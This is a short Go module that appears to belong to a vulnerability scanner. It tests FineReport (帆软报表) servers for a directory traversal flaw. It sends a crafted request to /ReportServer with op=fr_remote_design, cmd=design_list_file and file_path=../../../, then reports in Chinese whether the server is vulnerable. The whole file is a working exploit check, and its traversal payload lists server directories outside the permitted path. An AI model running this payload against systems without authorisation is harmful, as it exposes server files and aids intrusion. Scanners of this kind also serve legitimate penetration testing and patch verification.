package fanraun_mulubianli

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/ReportServer?op=fr_remote_design&cmd=design_list_file&file_path=../../../&current_uid=1&isWebReport=true"
	resp, err := client.R().
		SetHeader("User-Agent", UA).
		Get(vulnUrl)

	if err == nil && resp.StatusCode == 200 && strings.Contains(resp.String(), "xml") {
		return true
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		color.Green.Println("[+] 帆软报表 目录遍历漏洞存在 -> ", url)
	} else {
		color.Red.Println("[-] 帆软报表 目录遍历漏洞不存在")
	}
}
